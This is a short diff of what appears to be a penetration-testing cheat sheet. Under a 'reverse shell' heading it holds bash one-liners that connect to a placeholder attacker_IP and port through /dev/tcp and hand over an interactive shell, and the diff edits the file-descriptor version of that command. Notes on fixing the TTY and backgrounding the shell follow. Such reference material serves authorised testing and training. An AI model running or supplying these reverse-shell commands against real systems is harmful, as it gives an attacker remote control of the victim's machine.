@@ -330,7 +330,7 @@ return some_value_here
 
 # reverse shell
 bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
-0<&111;exec 111<>/dev/tcp/attacker_IP/port_here; bash <&111 >&111 2>&111
+0<&1;exec 1<>/dev/tcp/attacker_IP/port_here; bash <&1 >&1 2>&1
 
 # fix TTY
 #background reverse shell
